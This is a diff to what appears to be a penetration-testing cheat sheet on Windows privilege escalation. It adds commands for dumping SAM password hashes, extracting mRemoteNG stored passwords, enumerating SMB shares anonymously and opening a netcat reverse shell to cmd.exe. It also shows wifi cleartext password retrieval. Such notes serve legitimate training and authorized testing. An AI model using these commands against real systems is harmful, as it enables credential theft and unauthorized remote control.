@@ -70,6 +70,19 @@ Passwords are sometimes found in files. Additionally, the SAM file is interestin
   - Get SSID: `netsh wlan show profile`
   - Get cleartext password: `netsh wlan show profile [SSID] key=clear`
 
+Mounting .vhd files
+- `sudo apt install libguestfs-tools`
+- `guestmount --add [path].vhd --inspector --ro [placement-path]`
+
+Dumping SAM hashes
+- Find SAM in `C:\Windows\System32\config`
+- Find SYSTEM in `C:\Windows\System32\config`
+- `samdump2 [SYSTEM-path] [SAM-path]`
+
+mRemoteNG program holds passwords
+- Passwords stored in `C:\Users\[user]\Appdata\Roaming\mRemoteNG\confCons.xml`
+- To crack: https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py
+
 ### Anti-Virus Enumeration
 
 Enumeration:
@@ -146,7 +159,13 @@ Sending a crafted url payload to another account may have the user click on the 
 
 Try to upload a webshell when you hav access to smb/ftp.
 
-Enumerate smb: `smbclient \\\\[ip]\\ -L`
+Enumerate smb: 
+- `smbclient \\\\[ip]\\ -L`
+- `smbclient -L [ip] -N`
+- `smbmap -H [ip] -u 'null' --no-banner`
+- `smbclient //[ip]/[share] -N`
+- Mounting SMB shares:
+  - `mount -t cifs //[ip]/[share] /mnt -o user=,password=`
 
 Check all fields for SQL injection, code injection, XSS, etc...
 
@@ -159,7 +178,7 @@ Upgrading webshells:
 - Alternative Windows method
   - `locate nc.exe`
   - `cp [path to nc.exe] ~`
-  - `nc.exe -e cmd.exe [ip] [port]`
+  - `nc.exe [ip] [port] -e cmd.exe`
 
 Escalate using WSL:
 - Check where WSL is installed: `Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss |
@@ -192,6 +211,7 @@ Key common privileges
   - Run potato attack tools!
   - Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
   - Juicy Potato: https://github.com/ohpe/juicy-potato
+    - Main source: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 - SeBackup
 - SeCreateToken
 - SeDebug
